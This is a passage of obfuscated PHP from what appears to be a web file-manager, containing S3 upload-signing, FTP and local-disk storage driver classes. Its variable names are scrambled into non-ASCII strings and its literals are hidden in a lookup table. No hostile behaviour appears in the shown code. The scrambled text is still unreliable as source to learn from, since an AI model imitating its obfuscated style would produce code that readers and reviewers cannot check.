$Í‚´Ü›Ÿ[8]; $™ùè…Âñ = $ÈÍÓº->pathBase . ltrim($™ùè…Âñ, $Í‚´Ü›Ÿ[8]); } $™ùè…Âñ = $ÈÍÓº->getPath($™ùè…Âñ); if (isset($ÕŞ°’Ú[$Í‚´Ü›Ÿ[1156]])) { $™ùè…Âñ = $ÕŞ°’Ú[$Í‚´Ü›Ÿ[1156]]; } $ÈÍÓº->path = $™ùè…Âñ; return $ÈÍÓº; } public static function errorTips($¶«“Á‹‡ = false) { $ëºŞœìí =& $_SERVER[ÏéâËõ‘]; static $¬·¾¯ŠÀ = array(); $èìÆØÛ = 1000; if ($¶«“Á‹‡ === -1) { return $¬·¾¯ŠÀ ? $¬·¾¯ŠÀ[count($¬·¾¯ŠÀ) - 1] : $ëºŞœìí[12]; } if ($¶«“Á‹‡ === !1) { return implode($ëºŞœìí[231], $¬·¾¯ŠÀ); } if (count($¬·¾¯ŠÀ) >= $èìÆØÛ) { $¬·¾¯ŠÀ = array_slice($¬·¾¯ŠÀ, $èìÆØÛ * 0.5, $èìÆØÛ); } $¬·¾¯ŠÀ[] = $¶«“Á‹‡; write_log($ëºŞœìí[162] . ACTION . $ëºŞœìí[1187] . $¶«“Á‹‡, $ëºŞœìí[1188]); } public static function getLastError($Šğ¹ŞÇä = '') { $™¢²¯ßô = self::errorTips(-1); return $™¢²¯ßô ? $™¢²¯ßô : $Šğ¹ŞÇä; } } goto D´º¦Šç§; aÎŠ‰’¹Ì: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¨±ƒãôõ) { parent::__construct($¨±ƒãôõ); $this->signatureVersion($_SERVER[ÏéâËõ‘][216]); } public function uploadFormData($™ı–¼¬, $£Œå“°§ = 3600) { $Ğñ¡ëÛ° =& $_SERVER[ÏéâËõ‘]; $íÕ¹Á´” = $Ğñ¡ëÛ°[198]; $½¥åüÓÆ = $Ğñ¡ëÛ°[1352]; $ƒé´Œ¢œ = $Ğñ¡ëÛ°[62]; $Ğ‹Â²û = gmdate($Ğñ¡ëÛ°[1353]); $¦êŒÊÁ = gmdate($Ğñ¡ëÛ°[753]); $©Ì¹èÍ = $Ğñ¡ëÛ°[1354]; $ËÉ’ü“ = $£Œå“°§ . $Ğñ¡ëÛ°[12]; $Ìî¢çùë = $Ğñ¡ëÛ°[1315]; $ıÏÜùŸÒ = array($this->accessKey, $¦êŒÊÁ, $this->region, $ƒé´Œ¢œ, $©Ì¹èÍ); $Ïå¤¥öÚ = implode($Ğñ¡ëÛ°[8], $ıÏÜùŸÒ); $® Ù¤ = array($Ğñ¡ëÛ°[1317] => gmdate($Ğñ¡ëÛ°[1316], strtotime($Ğñ¡ëÛ°[1355])), $Ğñ¡ëÛ°[1318] => array(array($Ğñ¡ëÛ°[1320] => $this->bucket), array($Ğñ¡ëÛ°[1319] => $íÕ¹Á´”), array($Ğñ¡ëÛ°[1321], $Ğñ¡ëÛ°[1322], $Ğñ¡ëÛ°[12]), array($Ğñ¡ëÛ°[1321], $Ğñ¡ëÛ°[1356], $Ğñ¡ëÛ°[12]), array($Ğñ¡ëÛ°[1321], $Ğñ¡ëÛ°[1357], $Ğñ¡ëÛ°[12]), array($Ğñ¡ëÛ°[1323] => $Ìî¢çùë), array($Ğñ¡ëÛ°[1358] => $Ïå¤¥öÚ), array($Ğñ¡ëÛ°[1359] => $½¥åüÓÆ), array($Ğñ¡ëÛ°[1360] => $Ğ‹Â²û), array($Ğñ¡ëÛ°[1361] => $ËÉ’ü“))); $¨ÒÓæÇ = base64_encode(json_encode($® Ù¤)); $¸¬¥²Ø = hash_hmac($Ğñ¡ëÛ°[1362], $¦êŒÊÁ, $Ğñ¡ëÛ°[1363] . $this->secret, !0); $ú°…ç¬§ = hash_hmac($Ğñ¡ëÛ°[1362], $this->region, $¸¬¥²Ø, !0); $®µëÜæ = hash_hmac($Ğñ¡ëÛ°[1362], $ƒé´Œ¢œ, $ú°…ç¬§, !0); $¹ê§¢À = hash_hmac($Ğñ¡ëÛ°[1362], $©Ì¹èÍ, $®µëÜæ, !0); $˜òæÂ—£ = hash_hmac($Ğñ¡ëÛ°[1362], $¨ÒÓæÇ, $¹ê§¢À); $¤ºà÷ª­ = array($Ğñ¡ëÛ°[215] => $Ğñ¡ëÛ°[12], $Ğñ¡ëÛ°[1364] => $Ğñ¡ëÛ°[12], $Ğñ¡ëÛ°[1319] => $íÕ¹Á´”, $Ğñ¡ëÛ°[1323] => $Ìî¢çùë, $Ğñ¡ëÛ°[1327] => $¨ÒÓæÇ, $Ğñ¡ëÛ°[1365] => $Ïå¤¥öÚ, $Ğñ¡ëÛ°[1366] => $½¥åüÓÆ, $Ğñ¡ëÛ°[1367] => $Ğ‹Â²û, $Ğñ¡ëÛ°[1368] => $ËÉ’ü“, $Ğñ¡ëÛ°[1369] => $˜òæÂ—£, $Ğñ¡ëÛ°[181] => $this->getHost()); return $¤ºà÷ª­; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($ÚÍµî´ß) { parent::__construct(); if (count($ÚÍµî´ß) > 0) { $this->_init($ÚÍµî´ß); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($·øøİ») { $Ê×Îä‰” =& $_SERVER[ÏéâËõ‘]; global $config; $this->appCharset = $config[$Ê×Îä‰”[1370]]; $this->systemCharset = $config[$Ê×Îä‰”[1371]]; if (isset($·øøİ»[$Ê×Îä‰”[1372]]) && $·øøİ»[$Ê×Îä‰”[1372]]) { $this->systemCharset = $·øøİ»[$Ê×Îä‰”[1372]]; } } public function iconvApp($Äé Ú…Í) { return $this->iconvTo($Äé Ú…Í, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÜûàÙ´¿) { return $this->iconvTo($ÜûàÙ´¿, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÉÙ÷µ½â) { $âõÙØáç =& $_SERVER[ÏéâËõ‘]; $µ¾ÅŸ× = $this->iconvApp($this->pathBase); $ÉÙ÷µ½â = $this->iconvApp($ÉÙ÷µ½â); if (substr($µ¾ÅŸ×, 0, 2) == $âõÙØáç[1373]) { $µ¾ÅŸ× = BASIC_PATH . substr($µ¾ÅŸ×, 2); } if (substr($ÉÙ÷µ½â, 0, 2) == $âõÙØáç[1373]) { $ÉÙ÷µ½â = BASIC_PATH . substr($ÉÙ÷µ½â, 2); } $µ¾ÅŸ× = KodIO::clear($µ¾ÅŸ×); $ÉÙ÷µ½â = KodIO::clear($ÉÙ÷µ½â); $ÉÙ÷µ½â = substr($ÉÙ÷µ½â, strlen($µ¾ÅŸ×)); if (empty($this->pathDriver)) { return $ÉÙ÷µ½â; } return $this->pathDriver . $âõÙØáç[8] . ltrim($ÉÙ÷µ½â, $âõÙØáç[8]); } private function _init($‡àÉŒç = array()) { $Û”÷ÛÀ =& $_SERVER[ÏéâËõ‘]; if (!function_exists($Û”÷ÛÀ[1374])) { throw new Exception(LNG($Û”÷ÛÀ[1375])); } $this->config = $‡àÉŒç; $this->charsetReset($‡àÉŒç); foreach ($‡àÉŒç as $ğª¨ÀªÏ => $éñä‚Ş) { if (isset($this->{$ğª¨ÀªÏ})) { $this->{$ğª¨ÀªÏ} = $éñä‚Ş; } } return $this->_login($‡àÉŒç); } private function _login($ÛŒú®Şê) { $“³³“ßÍ =& $_SERVER[ÏéâËõ‘]; static $¥Û—¥Ò“ = array(); $ªÌûıçé = md5(json_encode($ÛŒú®Şê)); if (isset($¥Û—¥Ò“[$ªÌûıçé])) { foreach ($¥Û—¥Ò“[$ªÌûıçé] as $ôü»¼âô => $½“Ş£öù) { $this->{$ôü»¼âô} = $½“Ş£öù; } return !0; } $³ïöáèƒ = parse_url(trim($this->server, $“³³“ßÍ[8])); $this->host = $³ïöáèƒ[$“³³“ßÍ[181]]; $ÁÜåè£½ = isset($³ïöáèƒ[$“³³“ßÍ[180]]) && $³ïöáèƒ[$“³³“ßÍ[180]] == $“³³“ßÍ[1376] ? !0 : !1; $this->scheme = $ÁÜåè£½ ? $“³³“ßÍ[1377] : $“³³“ßÍ[1378]; $this->port = isset($³ïöáèƒ[$“³³“ßÍ[182]]) ? $³ïöáèƒ[$“³³“ßÍ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ì‹ŸÍÙë = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ğ€Ü˜øÂ = $this->pasv == $“³³“ßÍ[88] ? !0 : !1; @ftp_pasv($this->connect, $Ğ€Ü˜øÂ); $¥Û—¥Ò“[$ªÌûıçé] = array($“³³“ßÍ[1379] => $this->connect, $“³³“ßÍ[181] => $this->host, $“³³“ßÍ[180] => $this->scheme, $“³³“ßÍ[182] => $this->port); return $Ì‹ŸÍÙë; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ÆãÂ©‘Ş, $Ï­©Ÿ€» = '', $àëê¼ë = REPEAT_RENAME) { if ($this->setContent($ÆãÂ©‘Ş, $Ï­©Ÿ€»)) { return $this->getPathOuter($ÆãÂ©‘Ş); } return !1; } public function mkdir($óú£„ ˜, $ƒÂâÀ„ä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $óú£„ ˜ = $this->iconvSystem($óú£„ ˜); if ($this->_isFolder($óú£„ ˜) || @ftp_mkdir($this->connect, $óú£„ ˜)) { return $this->getPathOuter($óú£„ ˜); } if (!$this->mkdir($this->pathFather($óú£„ ˜))) { return !1; } if ($óú£„ ˜ = @ftp_mkdir($this->connect, $óú£„ ˜)) { return $this->getPathOuter($óú£„ ˜); } return !1; } public function copyFile($‚Ô˜Äšì, $ı›ä÷¦§) { if (!$this->_isconn()) { return !1; } $·Ãü úÉ = $this->pathThis($this->iconvSystem($‚Ô˜Äšì)); $´îÏçéÀ = $this->tempFile($·Ãü úÉ); $ÅÖŒÍš¾ = $this->iconvApp($´îÏçéÀ); $this->download($‚Ô˜Äšì, $ÅÖŒÍš¾); $ÈÏ¨ª²å = $this->upload($ı›ä÷¦§, $ÅÖŒÍš¾); $this->tempFileRemve($´îÏçéÀ); return $ÈÏ¨ª²å; } public function moveFile($Â£Ä£“, $¦ªÑÖ‹Ô) { if (!$this->_isconn()) { return !1; } $Â£Ä£“ = $this->iconvSystem($Â£Ä£“); $¦ªÑÖ‹Ô = $this->iconvSystem($¦ªÑÖ‹Ô); $ËÓÌ—— = @ftp_rename($this->connect, $Â£Ä£“, $¦ªÑÖ‹Ô); return $ËÓÌ—— ? $this->getPathOuter($¦ªÑÖ‹Ô) : !1; } public function delFile($ÑÓä“ğ€) { if (!$this->_isconn()) { return !1; } $ÑÓä“ğ€ = $this->iconvSystem($ÑÓä“ğ€); return @ftp_delete($this->connect, $ÑÓä“ğ€); } public function delFolder($Óé°ç€) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ËÛƒ²ÆŞ = $ŒÚâùíç = array(); $this->fileList($Óé°ç€, $ËÛƒ²ÆŞ, $ŒÚâùíç, !0); $this->listItemCache = !0; foreach ($ŒÚâùíç as $»å¦î´) { $–ÆˆÃĞ· = $this->iconvSystem($»å¦î´[$_SERVER[ÏéâËõ‘][32]]); $ö¨šø = @ftp_delete($this->connect, $–ÆˆÃĞ·); if (!$ö¨šø) { return !1; } } foreach ($ËÛƒ²ÆŞ as $–ÆˆÃĞ·) { $–ÆˆÃĞ· = $this->iconvSystem($–ÆˆÃĞ·); $ö¨šø = @ftp_rmdir($this->connect, $–ÆˆÃĞ·); if (!$ö¨šø) { return !1; } } $Óé°ç€ = $this->iconvSystem($Óé°ç€); return @ftp_rmdir($this->connect, $Óé°ç€); } public function rename($ƒì•îúˆ, $…ÕŞãµê) { $€ÃßÓ„ =& $_SERVER[ÏéâËõ‘]; if (!$this->_isconn()) { return !1; } $ÏÜäç¿Ø = $this->fileNameAuto($this->pathFather($ƒì•îúˆ), $…ÕŞãµê); $ÏÜäç¿Ø = $this->iconvSystem($ÏÜäç¿Ø); $ƒì•îúˆ = $this->iconvSystem($ƒì•îúˆ); $³¯Ëà®ü = $this->pathFather($ƒì•îúˆ); $˜™ŞôÅ = rtrim($³¯Ëà®ü, $€ÃßÓ„[8]) . $€ÃßÓ„[8] . $ÏÜäç¿Ø; $¶Ìøš = @ftp_rename($this->connect, $ƒì•îúˆ, $˜™ŞôÅ); $˜™ŞôÅ = $this->iconvApp($˜™ŞôÅ); return $¶Ìøš ? $this->getPathOuter($˜™ŞôÅ) : !1; } private function folderInfo($™ØËáä€, $ûÅÖ“Ì— = false) { $ïƒŒ³¾ä =& $_SERVER[ÏéâËõ‘]; $´ÈÁé²ï = array($ïƒŒ³¾ä[32] => $this->pathThis($™ØËáä€), $ïƒŒ³¾ä[84] => $this->getPathOuter($ïƒŒ³¾ä[8] . $™ØËáä€), $ïƒŒ³¾ä[33] => $ïƒŒ³¾ä[75]); if ($ûÅÖ“Ì—) { return $´ÈÁé²ï; } $´ÈÁé²ï[$ïƒŒ³¾ä[200]] = $´ÈÁé²ï[$ïƒŒ³¾ä[85]] = 0; $´ÈÁé²ï[$ïƒŒ³¾ä[201]] = $´ÈÁé²ï[$ïƒŒ³¾ä[202]] = !0; return $´ÈÁé²ï; } private function fileInfo($øÚÉ íÍ, $Ì¼İÛ± = false, $‡›çšçÀ = array()) { $æ“ƒÍîŸ =& $_SERVER[ÏéâËõ‘]; $²Ñ°ªÂá = array($æ“ƒÍîŸ[32] => $this->pathThis($øÚÉ íÍ), $æ“ƒÍîŸ[84] => $this->getPathOuter($æ“ƒÍîŸ[8] . $øÚÉ íÍ), $æ“ƒÍîŸ[33] => $æ“ƒÍîŸ[199], $æ“ƒÍîŸ[76] => isset($‡›çšçÀ[$æ“ƒÍîŸ[76]]) ? $‡›çšçÀ[$æ“ƒÍîŸ[76]] : 0, $æ“ƒÍîŸ[174] => $this->ext($øÚÉ íÍ)); if ($Ì¼İÛ±) { return $²Ñ°ªÂá; } $²Ñ°ªÂá[$æ“ƒÍîŸ[200]] = $²Ñ°ªÂá[$æ“ƒÍîŸ[85]] = 0; $²Ñ°ªÂá[$æ“ƒÍîŸ[201]] = $²Ñ°ªÂá[$æ“ƒÍîŸ[202]] = !0; $ë…¤ò« = $this->iconvSystem($øÚÉ íÍ); $²Ñ°ªÂá[$æ“ƒÍîŸ[85]] = @ftp_mdtm($this->connect, $ë…¤ò«); if (empty($‡›çšçÀ)) { $‡›çšçÀ = $this->objectMeta($øÚÉ íÍ); if (!$‡›çšçÀ) { return $²Ñ°ªÂá; } } $²Ñ°ªÂá[$æ“ƒÍîŸ[76]] = $‡›çšçÀ[$æ“ƒÍîŸ[76]]; return $²Ñ°ªÂá; } public function size($«µÌ³ó») { $ı³ÌÖ£ä = $this->objectMeta($«µÌ³ó»); return $ı³ÌÖ£ä ? $ı³ÌÖ£ä[$_SERVER[ÏéâËõ‘][76]] : 0; } public function info($ßÖÙ„ª–) { if ($this->isFile($ßÖÙ„ª–)) { return $this->fileInfo($ßÖÙ„ª–, 0); } else { if ($this->isFolder($ßÖÙ„ª–)) { return $this->folderInfo($ßÖÙ„ª–); } } return !1; } private function fileList($â¥œ½¬¢, &$Û¯«ĞÉ‹, &$È…ÀÓŠã, $ØÖ¸°Ø° = false) { $ôëÍ Ã =& $_SERVER[ÏéâËõ‘]; $â¥œ½¬¢ = $this->iconvSystem($â¥œ½¬¢); if (!$this->isFolder($â¥œ½¬¢)) { return !1; } @ftp_chdir($this->connect, $ôëÍ Ã[8]); $â¥œ½¬¢ = rtrim($â¥œ½¬¢, $ôëÍ Ã[8]) . $ôëÍ Ã[8]; check_abort(); $‡–ÑĞÄÏ = @ftp_rawlist($this->connect, $â¥œ½¬¢); if (!$‡–ÑĞÄÏ) { $‡–ÑĞÄÏ = array(); } $ÌÁ‹æÙù = array($ôëÍ Ã[10] => 1, $ôëÍ Ã[1380] => 1); foreach ($‡–ÑĞÄÏ as $±«ÁÀÁŒ) { $á²şæûƒ = $this->_listItem($±«ÁÀÁŒ); if ($á²şæûƒ[0] == $ôëÍ Ã[761]) { continue; } $Ë¸†õÀå = $á²şæûƒ[8]; if (empty($Ë¸†õÀå) && $Ë¸†õÀå !== $ôëÍ Ã[197] || isset($ÌÁ‹æÙù[$Ë¸†õÀå])) { continue; } $Ë¸†õÀå = $this->iconvApp($â¥œ½¬¢ . ltrim($Ë¸†õÀå, $ôëÍ Ã[8])); $·è†Üİç = array($ôëÍ Ã[32] => $Ë¸†õÀå, $ôëÍ Ã[33] => $ôëÍ Ã[199], $ôëÍ Ã[76] => $á²şæûƒ[4]); if (substr($±«ÁÀÁŒ, 0, 1) == $ôëÍ Ã[1381]) { $·è†Üİç[$ôëÍ Ã[33]] = $ôëÍ Ã[75]; $·è†Üİç[$ôëÍ Ã[76]] = 0; } $‹êıàÎü = $·è†Üİç[$ôëÍ Ã[33]] == $ôëÍ Ã[75] ? !0 : !1; $this->cacheMethodInfoSet($Ë¸†õÀå, $‹êıàÎü, $·è†Üİç); if ($‹êıàÎü) { $Û¯«ĞÉ‹[] = $Ë¸†õÀå; if ($ØÖ¸°Ø°) { $this->fileList($Ë¸†õÀå, $Û¯«ĞÉ‹, $È…ÀÓŠã, $ØÖ¸°Ø°); } continue; } $È…ÀÓŠã[] = $·è†Üİç; } $this->cacheMethodInfoSet($â¥œ½¬¢, !0); } private function _listItem($ëÅŠøöğ) { if (empty($ëÅŠøöğ)) { return array(); } $ößÈïÉı = preg_split($_SERVER[ÏéâËõ‘][1382], $ëÅŠøöğ); if (count($ößÈïÉı) <= 9) { return $ößÈïÉı; } $ößÈïÉı[8] = trim(substr($ëÅŠøöğ, strpos($ëÅŠøöğ, $ößÈïÉı[7]) + strlen($ößÈïÉı[7]))); return array_splice($ößÈïÉı, 0, 9); } public function listPath($Şí›¡®¥, $åÖˆçÀÅ = false) { $ÜåÑ ê‹ =& $_SERVER[ÏéâËõ‘]; if (!$this->_isconn()) { return !1; } $ƒÁúå­ = $ûäÒÕê® = array(); $this->fileList($Şí›¡®¥, $ƒÁúå­, $ûäÒÕê®); foreach ($ƒÁúå­ as $ÙõÙœè¥ => $ìÄö¬ÈÓ) { $ƒÁúå­[$ÙõÙœè¥] = $this->folderInfo($ìÄö¬ÈÓ, $åÖˆçÀÅ); } foreach ($ûäÒÕê® as $ÙõÙœè¥ => $ìÄö¬ÈÓ) { $ûäÒÕê®[$ÙõÙœè¥] = $this->fileInfo($ìÄö¬ÈÓ[$ÜåÑ ê‹[32]], $åÖˆçÀÅ, $ìÄö¬ÈÓ); } return array($ÜåÑ ê‹[82] => $ƒÁúå­, $ÜåÑ ê‹[83] => $ûäÒÕê®); } public function has($í¢äş, $Ì¶İ¿ƒ = false, $âÊ›Îô§ = true) { $èÄ¹•ˆå =& $_SERVER[ÏéâËõ‘]; $µ†œĞ¥ä = $ıÜÜœÑ‹ = array(); $óÊôÎ¿À = $Ì¶İ¿ƒ ? !0 : !1; $this->fileList($í¢äş, $µ†œĞ¥ä, $ıÜÜœÑ‹, $óÊôÎ¿À); if ($Ì¶İ¿ƒ) { return array($èÄ¹•ˆå[207] => count($ıÜÜœÑ‹), $èÄ¹•ˆå[208] => count($µ†œĞ¥ä)); } if ($âÊ›Îô§) { if (count($ıÜÜœÑ‹)) { return !0; } } else { if (count($µ†œĞ¥ä)) { return !0; } } return !1; } public function listAll($¶«… ƒÁ) { $ÅÊÖ¬‰Î =& $_SERVER[ÏéâËõ‘]; if (!$this->_isconn()) { return !1; } $şĞ£ü¶ = $İ÷†ÔŸŠ = array(); $this->fileList($¶«… ƒÁ, $şĞ£ü¶, $İ÷†ÔŸŠ, !0); $ô£»ïÖè = array(); foreach ($İ÷†ÔŸŠ as $›àÕ€˜…) { $ô£»ïÖè[$›àÕ€˜…[$ÅÊÖ¬‰Î[32]]] = $›àÕ€˜…[$ÅÊÖ¬‰Î[76]]; } foreach ($şĞ£ü¶ as $›àÕ€˜…) { if (is_string($›àÕ€˜…)) { $ô£»ïÖè[$›àÕ€˜…] = 0; } } return $this->listAllFiles($¶«… ƒÁ, array_keys($ô£»ïÖè), $ô£»ïÖè); } public function getContent($¸òÄè¯¶) { if (!$this->_isconn()) { return !1; } $¸òÄè¯¶ = $this->iconvSystem($¸òÄè¯¶); return $this->fileSubstr($¸òÄè¯¶); } public function setContent($‘˜‘’Æ¹, $ˆ“¡ÊÅ¼ = '') { if (!$this->_isconn()) { return !1; } $¿¾ŒÆ‚õ = $this->pathThis($this->iconvSystem($‘˜‘’Æ¹)); $®ç¡ìĞ = $this->tempFile($¿¾ŒÆ‚õ); file_put_contents($®ç¡ìĞ, $ˆ“¡ÊÅ¼); $ĞßÁæê£ = $this->upload($‘˜‘’Æ¹, $this->iconvApp($®ç¡ìĞ)); $this->tempFileRemve($®ç¡ìĞ); return $ĞßÁæê£; } public function fileSubstr($øÕÂ¬Äâ, $ÓŒ‰ É€ = 0, $†°®ùè› = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($øÕÂ¬Äâ, $ÓŒ‰ É€, $†°®ùè›); } private function ftpRequest($½Ğá‡´Å, $îÛ¯«ÌÂ = 0, $Éå¬Œ÷Ê = false) { $½Ğá‡´Å = $this->iconvSystem($½Ğá‡´Å); $ ·õ­ø« = $this->scheme . $this->host . $_SERVER[ÏéâËõ‘][4] . $this->port; $°”ß£–ı = curl_init(); curl_setopt($°”ß£–ı, CURLOPT_URL, $ ·õ­ø« . $this->pathEncode($½Ğá‡´Å)); curl_setopt($°”ß£–ı, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Éå¬Œ÷Ê) { $’÷Ì¤Ä = $îÛ¯«ÌÂ + $Éå¬Œ÷Ê - 1; curl_setopt($°”ß£–ı, CURLOPT_RANGE, "{$îÛ¯«ÌÂ}\55{$’÷Ì¤Ä}"); } curl_setopt($°”ß£–ı, CURLOPT_RETURNTRANSFER, 1); $ê¥±Ú¬ = curl_exec($°”ß£–ı); curl_close($°”ß£–ı); return $ê¥±Ú¬; } public function upload($µ–ãœ‘¦, $òì¹Ã‰, $ñ–Ø÷àà = false, $ËüÕÂ¹‰ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($µ–ãœ‘¦))) { return !1; } $µ–ãœ‘¦ = $this->iconvSystem($µ–ãœ‘¦); $òì¹Ã‰ = $this->iconvSystem($òì¹Ã‰); $³¼ï™å÷ = ftp_nb_put($this->connect, $µ–ãœ‘¦, $òì¹Ã‰, FTP_BINARY); while ($³¼ï™å÷ == FTP_MOREDATA) { $³¼ï™å÷ = ftp_nb_continue($this->connect); } if ($³¼ï™å÷ != FTP_FINISHED) { return !1; } return $this->getPathOuter($µ–ãœ‘¦); } public function download($¡¹£¹¶Â, $ÅíµİÇ£ = '') { if (!$this->_isconn()) { return !1; } $Êà®ê«à = $this->pathFather($ÅíµİÇ£); if (!IO::mkdir($Êà®ê«à)) { return !1; } $¡¹£¹¶Â = $this->iconvSystem($¡¹£¹¶Â); $ÅíµİÇ£ = $this->iconvSystem($ÅíµİÇ£); $É·µ°ÏÂ = ftp_nb_get($this->connect, $ÅíµİÇ£, $¡¹£¹¶Â, FTP_BINARY); while ($É·µ°ÏÂ == FTP_MOREDATA) { $É·µ°ÏÂ = ftp_nb_continue($this->connect); } if ($É·µ°ÏÂ != FTP_FINISHED) { return !1; } return $this->iconvApp($ÅíµİÇ£); } public function exist($»‡ı™æ) { return $this->isFile($»‡ı™æ) || $this->isFolder($»‡ı™æ); } public function isFile($ƒ¢Éâ¾¹) { return !$this->isFolder($ƒ¢Éâ¾¹) && $this->objectMeta($ƒ¢Éâ¾¹); } public function isFolder($–‡ÜöÇ°) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][165], $–‡ÜöÇ°); } protected function objectMeta($ˆİ²ç®) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][167], $ˆİ²ç®); } protected function _objectMeta($¾®•ó”Â) { $£ğ˜„‘ˆ =& $_SERVER[ÏéâËõ‘]; if ($¾®•ó”Â == $£ğ˜„‘ˆ[12] || $¾®•ó”Â == $£ğ˜„‘ˆ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¾®•ó”Â = $this->iconvSystem($¾®•ó”Â); $À±ƒ¿ = array($£ğ˜„‘ˆ[32] => $this->iconvApp($¾®•ó”Â), $£ğ˜„‘ˆ[33] => $£ğ˜„‘ˆ[199], $£ğ˜„‘ˆ[76] => 0); @ftp_chdir($this->connect, $£ğ˜„‘ˆ[8]); $¼ûóÖşú = @ftp_size($this->connect, $¾®•ó”Â); if ($¼ûóÖşú != -1) { $À±ƒ¿[$£ğ˜„‘ˆ[76]] = $¼ûóÖşú; } else { $»‰ê‡ˆ¯ = @ftp_chdir($this->connect, $¾®•ó”Â); if (!$»‰ê‡ˆ¯) { return !1; } $À±ƒ¿[$£ğ˜„‘ˆ[33]] = $£ğ˜„‘ˆ[75]; } return $À±ƒ¿; } protected function _isFolder($“ó£üÍí) { $•ˆÕ‘ı© =& $_SERVER[ÏéâËõ‘]; if ($“ó£üÍí == $•ˆÕ‘ı©[12] || $“ó£üÍí == $•ˆÕ‘ı©[8]) { return !0; } $¬Ûº‚ö = $this->_objectMeta($“ó£üÍí); return isset($¬Ûº‚ö[$•ˆÕ‘ı©[33]]) && $¬Ûº‚ö[$•ˆÕ‘ı©[33]] == $•ˆÕ‘ı©[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($åÅµÂ—Å) { if (substr($åÅµÂ—Å, 0, 2) == $_SERVER[ÏéâËõ‘][1373]) { $åÅµÂ—Å = BASIC_PATH . substr($åÅµÂ—Å, 2); } return $åÅµÂ—Å; } public function iconvApp($µÑœÏÊ‡) { $ Åôâ’„ =& $_SERVER[ÏéâËõ‘]; global $config; return $this->iconvTo($µÑœÏÊ‡, $config[$ Åôâ’„[1371]], $config[$ Åôâ’„[1370]]); } public function iconvSystem($Ø¹é™ñ) { $åå’è­‡ =& $_SERVER[ÏéâËõ‘]; global $config; return $this->iconvTo($Ø¹é™ñ, $config[$åå’è­‡[1370]], $config[$åå’è­‡[1371]]); } public function getPathOuter($Ñ‹ÕŞ™) { $‰áµÉ«æ =& $_SERVER[ÏéâËõ‘]; $çÖ˜¦‰ = $this->iconvApp($this->pathBase); $Ñ‹ÕŞ™ = $this->iconvApp($Ñ‹ÕŞ™); if (substr($çÖ˜¦‰, 0, 2) == $‰áµÉ«æ[1373]) { $çÖ˜¦‰ = BASIC_PATH . substr($çÖ˜¦‰, 2); } if (substr($Ñ‹ÕŞ™, 0, 2) == $‰áµÉ«æ[1373]) { $Ñ‹ÕŞ™ = BASIC_PATH . substr($Ñ‹ÕŞ™, 2); } $çÖ˜¦‰ = KodIO::clear($çÖ˜¦‰); $Ñ‹ÕŞ™ = KodIO::clear($Ñ‹ÕŞ™); $Ñ‹ÕŞ™ = substr($Ñ‹ÕŞ™, strlen($çÖ˜¦‰)); if (empty($this->pathDriver)) { return $Ñ‹ÕŞ™; } return $this->pathDriver . $‰áµÉ«æ[8] . ltrim($Ñ‹ÕŞ™, $‰áµÉ«æ[8]); } public function mkfile($¥‰Â³ˆŞ, $°èèô– = '', $ˆí¦üù = REPEAT_RENAME) { $¥‰Â³ˆŞ = $this->iconvSystem($¥‰Â³ˆŞ); @touch($¥‰Â³ˆŞ); if ($°èèô–) { file_put_contents($¥‰Â³ˆŞ, $°èèô–); } @chmod($¥‰Â³ˆŞ, $this->pathAuth); return is_file($¥‰Â³ˆŞ) ? $this->getPathOuter($¥‰Â³ˆŞ) : !1; } public function mkdir($‰Úñê«, $Òà§îÕ— = REPEAT_SKIP) { $‰Úñê« = $this->iconvSystem($‰Úñê«); if (is_dir($‰Úñê«)) { return $this->getPathOuter($‰Úñê«); } @mkdir($‰Úñê«, $this->pathAuth, !0); @chmod($‰Úñê«, $this->pathAuth); return is_dir($‰Úñê«) ? $this->getPathOuter($‰Úñê«) : !1; } public function copyFile($«åğÆ¾§, $­Å‰—µÏ) { $this->mkdir($this->pathFather($­Å‰—µÏ)); $«åğÆ¾§ = $this->iconvSystem($«åğÆ¾§); $­Å‰—µÏ = $this->iconvSystem($­Å‰—µÏ); $«É÷ë³‚ = copy_64($«åğÆ¾§, $­Å‰—µÏ); @chmod($­Å‰—µÏ, $this->pathAuth); return $«É÷ë³‚ ? $this->getPathOuter($­Å‰—µÏ) : !1; } public function moveFile($É¦›îçø, $¾éÉ›»Ö) { $this->mkdir($this->pathFather($¾éÉ›»Ö)); $É¦›îçø = $this->iconvSystem($É¦›îçø); $¾éÉ›»Ö = $this->iconvSystem($¾éÉ›»Ö); $ˆÀ¶¤€± = intval(@rename($É¦›îçø, $¾éÉ›»Ö)); if (!$ˆÀ¶¤€±) { if ($ˆÀ¶¤€± = intval(@copy_64($É¦›îçø, $¾éÉ›»Ö))) { @unlink($É¦›îçø); } } @chmod($¾éÉ›»Ö, $this->pathAuth); return $ˆÀ¶¤€± ? $this->getPathOuter($¾éÉ›»Ö) : !1; } public function movePath($†›¢õª¿, $ÎØé±›, $ˆÕÑš¤¦ = false) { $ŠËô„é =& $_SERVER[ÏéâËõ‘]; $†›¢õª¿ = $this->iconvSystem($†›¢õª¿); $ÎØé±› = $this->iconvSystem($ÎØé±›); $½¨‘Ü˜è = rtrim($ÎØé±›, $ŠËô„é[8]) . $ŠËô„é[8] . ($ˆÕÑš¤¦ ? $ˆÕÑš¤¦ : get_path_this($†›¢õª¿)); if 